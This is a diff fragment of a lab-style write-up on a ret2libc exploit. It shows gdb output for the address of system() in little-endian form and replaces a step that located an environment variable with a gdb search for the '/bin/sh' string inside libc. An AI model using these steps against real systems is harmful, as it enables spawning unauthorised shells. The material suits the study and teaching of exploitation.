@@ -23,11 +23,10 @@ $1 = {<text variable, no debug info>} 0xb7e6b060 <system>
 ```
 in little-endian : `\x60\xb0\xe6\xb7`
 
-Then, we write a small program to find the address of environment variables (available in ressoures).
+To get the "/bin/sh" string to pass in, were going to have find it inside of libc
 ```
-$ gcc getenv.c -o getenv
-$ ./getenv SHELL
-SHELL is at 0xbffff935
+(gdb) find &system, +9999999, "/bin/sh"
+0xb7f8cc58
 ```
 Next, we find the address of the ret instruction:
 ```
